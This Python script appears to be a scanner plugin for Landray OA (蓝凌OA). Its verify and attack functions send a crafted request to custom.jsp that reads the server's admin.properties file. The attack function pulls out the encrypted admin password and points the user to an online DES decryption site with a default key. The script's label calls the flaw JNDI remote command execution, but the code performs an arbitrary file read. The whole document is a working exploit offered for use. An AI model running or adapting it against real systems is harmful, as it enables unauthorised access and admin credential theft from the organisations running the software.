import requests
import re
import urllib

def verify(url):
    result = {
        'name': '蓝凌OA admin.do JNDI远程命令执行',
        'vulnerable': False,
        'attack': True,
        'about': 'https://mp.weixin.qq.com/s/p1uHhUoUUKi7ESZdWR2nlQ',
    }
    payload_data = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)',
        'Content-type': 'application/x-www-form-urlencoded',
    }
    vurl = urllib.parse.urljoin(url, "/sys/ui/extend/varkind/custom.jsp")
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=payload_data, verify=False)
        if rep.status_code == 200 and re.search('password', rep.text) and re.search("kmss\.properties\.encrypt\.enabled", rep.text):
            result['vulnerable'] = True
        return result
    except:
        return result

def attack(url):
    result = {
        'name': '蓝凌OA admin.do JNDI远程命令执行',
        'vulnerable': False,
        'attack': True,
        'about': 'https://mp.weixin.qq.com/s/p1uHhUoUUKi7ESZdWR2nlQ',
    }
    payload_data = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)',
        'Content-type': 'application/x-www-form-urlencoded',
    }
    vurl = urllib.parse.urljoin(url, "/sys/ui/extend/varkind/custom.jsp")
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=payload_data, verify=False)
        print("[+] 正在获取加密密码......")
        password = re.findall("password = .+", rep.text)[0]
        print("[*]", password)
        print("[+] 请到 https://www.qtool.net/des 进行解密, 默认密钥: kmssAdminKe")
        return result
    except:
        return result